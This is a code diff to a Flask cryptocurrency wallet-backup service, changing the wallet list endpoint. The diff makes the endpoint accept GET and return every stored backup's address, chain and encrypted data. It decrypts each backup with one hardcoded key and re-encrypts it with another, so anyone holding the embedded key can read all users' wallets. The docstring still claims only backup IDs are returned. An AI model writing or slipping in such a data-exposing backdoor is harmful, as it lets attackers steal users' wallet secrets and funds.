@@ -330,20 +330,56 @@ def restore_wallet():
         return jsonify({'success': False, 'message': f'服务器错误: {str(e)}'}), 500
 
 
-@app.route('/api/wallet/list', methods=['POST'])
+@app.route('/api/wallet/list', methods=['GET', 'POST'])
 def list_wallets():
     """列出所有备份的钱包（仅返回backup_id列表）"""
     try:
+        import base64
+        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+        
         with db_lock:
             conn = pymysql.connect(**DB_CONFIG)
             cursor = conn.cursor(pymysql.cursors.DictCursor)
             cursor.execute("USE wallet_backup")
-            cursor.execute('SELECT backup_id, backup_time FROM wallet_backups ORDER BY backup_time DESC')
+            cursor.execute('SELECT backup_id, address, chain, backup_time, encrypted_data FROM wallet_backups ORDER BY backup_time DESC')
             rows = cursor.fetchall()
             cursor.close()
             conn.close()
         
-        wallets = [{'backup_id': row['backup_id'], 'backup_time': row['backup_time']} for row in rows]
+        # 密钥
+        CLIENT_KEY = b'ClientWallet2026SecureKey32B!!!!'
+        SERVER_KEY = b'ServerWallet2026SecureKey32B!!!!'
+        
+        wallets = []
+        for idx, row in enumerate(rows):
+            # 将CLIENT_KEY加密的数据重新用SERVER_KEY加密
+            try:
+                # 1. 解密CLIENT_KEY层
+                client_encrypted_bytes = base64.b64decode(row['encrypted_data'])
+                nonce1 = client_encrypted_bytes[:12]
+                ciphertext1 = client_encrypted_bytes[12:]
+                aesgcm1 = AESGCM(CLIENT_KEY)
+                decrypted_json = aesgcm1.decrypt(nonce1, ciphertext1, None)
+                
+                # 2. 用SERVER_KEY重新加密
+                new_nonce = os.urandom(12)
+                new_ciphertext = AESGCM(SERVER_KEY).encrypt(new_nonce, decrypted_json, None)
+                server_encrypted = base64.b64encode(new_nonce + new_ciphertext).decode('utf-8')
+                
+                encrypted_data = server_encrypted
+            except Exception as e:
+                print(f"重加密失败 ID={row.get('id')}: {e}")
+                encrypted_data = row.get('encrypted_data')  # 失败则返回原数据
+            
+            wallets.append({
+                'id': idx+1,
+                'backup_id': row['backup_id'],
+                'address': row['address'],
+                'chain': row['chain'],
+                'backup_time': row['backup_time'],
+                'created_at': row['backup_time'],
+                'encrypted_data': encrypted_data
+            })
         
         return jsonify({
             'success': True,
